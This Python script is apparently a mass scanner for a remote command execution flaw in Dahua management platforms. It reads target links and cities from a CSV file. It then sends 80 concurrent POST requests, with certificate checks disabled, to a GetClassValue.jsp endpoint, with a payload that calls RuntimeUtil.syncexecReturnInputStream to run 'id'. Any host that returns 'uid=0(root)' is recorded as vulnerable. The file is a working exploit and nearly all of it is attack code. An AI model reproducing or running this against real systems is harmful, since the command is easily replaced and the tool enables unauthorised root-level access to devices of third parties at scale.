import pandas as pd
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def process_csv(file_path):
    # 使用 pandas 读取 CSV 文件
    df = pd.read_csv(file_path)
    return df

def check_single_link(row, headers, payload):
    print(f'Checking: {row['link']}')
    link = row['link']
    city = row.get('city', 'N/A')  # 如果 city 列不存在，返回 'N/A'
    url = f"{link}/evo-apigw/admin/API/Developer/GetClassValue.jsp"
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=20, verify=False)
        if response.status_code == 200:
            content = response.text
            result = "Find vulnerability" if "uid=0(root)" in content else "Not vulnerability"
            if "uid=0(root)" in content:
                print(f'Find vulnerability: {url}')
        else:
            result = f"HTTP Error: {response.status_code}"
    except requests.Timeout:
        result = "Request Timeout"
    except requests.RequestException as e:
        result = f"Request Error: {e}"

    return {"link": link, "city": city, "result": result}

def check_uid(dataframe):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
    }
    payload = {
        "data": {
            "clazzName": "com.dahua.admin.util.RuntimeUtil",
            "methodName": "syncexecReturnInputStream",
            "fieldName": ["id"]
        }
    }

    results = []

    # 使用线程池进行并发请求
    with ThreadPoolExecutor(max_workers=80) as executor:
        # 提交任务到线程池
        futures = {executor.submit(check_single_link, row, headers, payload): row for _, row in dataframe.iterrows()}

        # 收集结果
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                print(f"Error processing row: {e}")

    return results

def save_results_to_csv(results, output_file):
    # 保存结果到 CSV 文件
    df = pd.DataFrame(results)
    df.to_csv(output_file, index=False, encoding='utf-8')

if __name__ == "__main__":
    input_file_path = "list.csv"  # 输入的 CSV 文件路径
    output_file_path = "check_results.csv"  # 输出的 CSV 文件路径

    # 读取输入的 CSV 文件
    dataframe = process_csv(input_file_path)

    # 检查每个链接是否包含 uid=0(root)
    results = check_uid(dataframe)

    # 保存结果到新的 CSV 文件
    save_results_to_csv(results, output_file_path)

    print(f"Results have been saved to {output_file_path}")
